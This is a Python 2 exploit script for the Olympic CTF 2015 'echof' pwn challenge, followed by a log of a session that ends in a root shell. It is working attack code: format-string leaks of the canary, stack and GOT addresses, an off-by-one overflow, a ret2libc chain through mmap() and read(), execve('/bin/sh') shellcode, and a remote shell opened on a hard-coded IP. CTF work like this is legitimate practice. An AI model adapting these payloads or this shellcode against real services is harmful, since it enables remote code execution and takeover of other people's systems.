#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# Olympic CTF 2015 - echof (pwn 300pt)
# --------------------------------------------------------------------------------------------------
import socket
import struct
import telnetlib
import string

# --------------------------------------------------------------------------------------------------
def recv_until(st):                                 # receive until you encounter a string
    ret = ""

    while st not in ret:
        ret += s.recv(8192)

    return ret


# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    s = socket.create_connection(('109.233.61.11', 3129))
    # s = socket.create_connection(('www.ispo.gr', 7777))

    recv_until("pw?")
    s.send('letmein' + '\n')    

    recv_until("msg?")


    # -------------------------------------------------------------------------
    # The vuln:
    #   .text:56555B8B C6 00 00        mov     byte ptr [eax], 0  ; off by 1 !
    #
    # First round of Leaks
    # -------------------------------------------------------------------------
    payload  = '%10$08x'                        # offset of a stack address
    payload += '%78$08x'                        # offset of stack canary
    payload += '%111$08x'                       # offset of main()
    payload += 'A'*(128 - len(payload) - 1)     # pad to overflow with NULL byte
    s.send(payload + '\n')

    resp = recv_until("msg?")
    
    stack  = int(resp[0 :8 ], 16)
    canary = int(resp[8 :16], 16)
    main   = int(resp[16:24], 16)
    
    stack_base = stack + 0x22c
    ebp        = stack - 0x9c
    got        = main + 0x15ec
    
    print '[+] Leaking a stack address:', hex(stack)
    print '[+] Leaking canary:', hex(canary)
    print '[+] Stack base at:', hex(stack_base)
    print '[+] %ebp at:', hex(ebp)
    print '[+] main() at:', hex(main)
    print '[+] .got starts at:', hex(got)

    
    # -------------------------------------------------------------------------
    # Second round of Leaks
    # -------------------------------------------------------------------------
    payload  = '%18$s'                          # read string that starts from .got.mmap
    payload += 'DELIM'                          # add a delimiter
    payload += '%19$s'                          # read string that starts from .got.read
    payload += 'p'
    payload += struct.pack("<L", got + 0x34)    # & .got.mmap (make sure they are NULL-free)
    payload += struct.pack("<L", got + 0xc)     # & .got.read
    payload += 'B'*(128 - len(payload) - 1)
    s.send(payload + '\n')

    resp = recv_until("msg?")
    off  = resp.find('DELIM') + 5               # distinguish addresses

    mmap  = struct.unpack("<L", resp[0:4])[0]
    read  = struct.unpack("<L", resp[off:off+4])[0]
    
    print '[+] .got.mmap() at:', hex(mmap)
    print '[+] .got.read() at:', hex(read)


    # -------------------------------------------------------------------------
    # '%n' is not allowed, so we have to use the overflow to hijack control.
    # We don't know which libc is used, so we'll do a ret-2-libc. Our plan is
    # to return to mmap() and create an RWX page, then return to read() and
    # write some shellcode to it and finally return to that shellcode.
    #
    # Because classic ret2libc, allows up to 2 returns, we'll use this gadget
    # to "make space" on the stack:
    #
    #       .text:56555C69 83 C4 1C        add     esp, 1Ch
    #       .text:56555C6C 5B              pop     ebx
    #       .text:56555C6D 5E              pop     esi
    #       .text:56555C6E 5F              pop     edi
    #       .text:56555C6F 5D              pop     ebp
    #       .text:56555C70 C3              retn
    #
    # Because input buffer is 128 bytes, but our r2libc requires more, we 
    # prepare stack in 2 steps. This is the 2nd step (return to read() and then
    # return to shellcode).
    #
    # One problem here is that we cannot write NULL bytes. To overcome this we
    # look for a NULL byte in stack and we print it using '%c'. Such a null
    # byte exists at 4$.
    # -------------------------------------------------------------------------
    print '[+] Return to libc, 2nd part ...'

    payload  = '%360x'                          # overflow
    payload += 'E'*12                           # padding
    payload += struct.pack("<L", read)          # & read
    payload += struct.pack("<L", 0x31337001)    # next return: shellcode (+1 offset)

    payload += '%4$c%4$c%4$c%4$c'               # fd = 0 (stdin)
    N = struct.pack("<L", 0x31337000)
    payload += '%%4$c%c%c%c' % (N[1],N[2],N[3]) # buf
    payload += '\x80%4$c%4$c%4$c'               # count = 128
    
    payload += 'D'*(128 - len(payload) - 1)     # pad
    s.send(payload + '\n')

    recv_until("msg?")


    # -------------------------------------------------------------------------
    # The first part of return 2 libc.
    # -------------------------------------------------------------------------
    print '[+] Return to libc, 1st part ...'

    payload  = struct.pack("<L", 0x11111110)
    payload += '%252x'
    
    C = struct.pack("<L", canary)               # canary has NULL LSB
    payload += '%%4$c%c%c%c' % (C[1],C[2],C[3]) # preserve canary
    payload += 'B'*8                            # pad
    payload += struct.pack("<L", ebp+0x150)     # fix ebp
    payload += struct.pack("<L", mmap)          # & mmap
    payload += struct.pack("<L", main + 0x2bd)  # next return: pop gadget

    N = struct.pack("<L", 0x31337000)
    payload += '%%4$c%c%c%c' % (N[1],N[2],N[3]) # buf
    payload += '%4$c\x10%4$c%4$c'               # 0x1000
    payload += '\x07%4$c%4$c%4$c'               # 7
    payload += '\x32%4$c%4$c%4$c'               # 32
    payload += struct.pack("<L", 0xffffffff)    # -1
    payload += '%4$c%4$c%4$c%4$c'               # 0
    payload += '%20x'                           # pad
    payload += struct.pack("<L", main + 0x2bd)  # & pop gadget (we need more)
    payload += 'C'*(128 - len(payload) - 1)
    s.send(payload + '\n')

    recv_until("msg?")


    # -------------------------------------------------------------------------
    # Now send some dummy messages to complete the 16 iterations
    # -------------------------------------------------------------------------    
    print '[+] Sending dummy messages ...'

    for i in range(16-5):
        s.send('dummy' + '\n')
        recv_until("msg?")


    # -------------------------------------------------------------------------
    # Write shellcode to the newly allocated region and get a shell
    # -------------------------------------------------------------------------
    print '[+] Sending shellcode ...'

    payload += "\x90" * 10                      # NOP sled (we start from offset +1)
    payload += "\x31\xc0\x50\x68\x2f\x2f\x73"   # an execve(/bin/sh) shellcode()
    payload += "\x68\x68\x2f\x62\x69\x6e\x89"
    payload += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
    payload += "\xcd\x80\x31\xc0\x40\xcd\x80"
    s.send(payload + '\n')


    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                          # try to open shell
    t.sock = s
    t.interact()

# --------------------------------------------------------------------------------------------------
'''
ispo@nogirl:~/ctf/2014/olympic_ctf$ ./echof_expl.py 
    [+] Leaking a stack address: 0xbf8b5224
    [+] Leaking canary: 0x59cb2d00
    [+] Stack base at: 0xbf8b5450
    [+] %ebp at: 0xbf8b5188
    [+] main() at: 0xb77d89ac
    [+] .got starts at: 0xb77d9f98
    [+] .got.mmap() at: 0xb76d5c50
    [+] .got.read() at: 0xb76c8af0
    [+] Return to libc, 2nd part ...
    [+] Return to libc, 1st part ...
    [+] Sending dummy messages ...
    [+] Sending shellcode ...
    [+] Opening Shell...
                                                                                            80
    id
        uid=0(root) gid=0(root) groups=0(root)
    ls -l
        total 120
        -rw------- 1 root root 307200 Dec 16 14:02 core
        -rwxr-xr-x 1 root root  13432 Dec 10 03:33 election
        -rwxr-xr-x 1 root root   5464 Dec 16 03:35 task
    date
    exit
    *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
